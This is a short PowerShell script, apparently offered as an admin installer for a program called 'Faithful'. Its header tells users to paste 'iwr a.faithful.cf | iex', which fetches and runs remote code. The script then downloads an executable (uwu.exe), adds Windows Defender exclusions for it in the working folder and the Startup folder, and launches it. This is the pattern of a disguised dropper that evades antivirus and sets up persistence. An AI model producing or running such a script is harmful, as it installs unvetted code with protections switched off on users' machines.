# Run this script as an administrator : Run powershell as admin before executing.
# Command to execute:
# iwr a.faithful.cf | iex

Write-Output "The Faithful script was recently updated, and this administrator script was re-added."
Write-Output "[LAST UPDATE]: 22/5/2022 12:45 PM"
Write-Output "(INFO) Starting download..."
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/uwu-executable.exe -OutFile "uwu.exe"
Write-Output "(INFO) Executable downloaded"
Write-Output "(INFO) Adding exclusions for Windows defender..."
Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\uwu.exe"
Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\uwu.exe"
Write-Output "(INFO) Exclusions added. If the above two commands failed, you need to add Faithful as an exclusion manually so that the program continues to work."
Write-Output "(INFO) The two exclusion paths to add are:"
Write-Output "(INFO) $((Get-Item .).FullName)\uwu.exe"
Write-Output "(INFO) and"
Write-Output "(INFO) $env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\uwu.exe"
Write-Output "(INFO) You can ignore the output if the previous command was successful."
Write-Output "(INFO) Starting Faithful..."
Start-Process ("uwu.exe")
Write-Output "(INFO) Done!"
